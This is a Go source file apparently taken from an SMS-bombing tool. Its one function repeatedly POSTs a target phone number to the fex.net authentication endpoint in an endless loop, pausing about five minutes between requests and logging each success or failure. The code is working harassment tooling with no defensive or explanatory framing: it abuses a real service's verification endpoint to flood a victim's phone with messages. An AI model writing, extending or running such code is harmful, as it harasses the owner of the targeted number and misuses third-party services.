package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func fex() {
	req := newreq()
	req.SetBodyString(`{"phone":"+` + num + `"}`)
	req.Header.SetContentType("application/json")
	req.SetRequestURI("https://api.fex.net/api/v1/auth/scaffold")
	req.Header.SetMethod("POST")

	timeout := time.Minute*5 + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"id"`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
